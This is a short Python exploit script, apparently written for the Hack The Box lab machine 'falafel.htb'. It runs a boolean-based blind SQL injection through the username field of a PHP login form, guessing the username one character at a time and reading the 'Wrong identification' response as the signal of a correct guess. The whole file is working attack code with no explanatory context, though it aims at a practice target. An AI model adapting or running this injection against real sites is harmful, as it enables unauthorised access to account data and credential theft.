#!/usr/bin/python3
# coding: utf-8

from pwn import *
import requests
import time
import string
import pdb

def def_handler(sig, frame):
	print("\n\n[!]Saindo...\n\n")
	sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variable_Global
main_url = "http://falafel.htb/login.php"
burp = {'http': 'http://127.0.0.1:8080'}
characters = string.ascii_lowercase

def makeRequest():

	p1 = log.progress("Brute Force")
	p2 = log.progress("Username")
	p1.status("Start Brute Force")
	
	sleep(2)

	user = ''
	
	for position in range(1,11):
		for character in characters:

			p1.status(f"Verify character {character} in position {position}")

			data_post = {
				"username": f"admin' and substring(username,{position},1)='{character}'-- -",
				"password": "test"
			}

			r = requests.post(main_url, data=data_post)

			if "Wrong identification" in r.text:
				user += character
				p2.status(user)
				break

if __name__ == '__main__':
	makeRequest()
